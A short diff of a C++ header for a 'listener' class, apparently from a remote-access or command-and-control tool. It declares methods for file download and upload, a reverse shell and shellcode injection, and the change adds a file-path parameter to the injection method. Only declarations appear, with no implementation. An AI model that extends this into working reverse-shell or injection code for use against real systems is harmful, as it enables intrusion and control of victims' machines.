@@ -38,8 +38,8 @@ class listener{
     int downloadFile(string r_path, string l_path);
     int uploadFile(string l_path, string r_path);
     int reverseShell();
-	int injectShellcode();
 	void setID(int pid);
+	int injectShellcode(string l_path);
 	string print();
 };
 
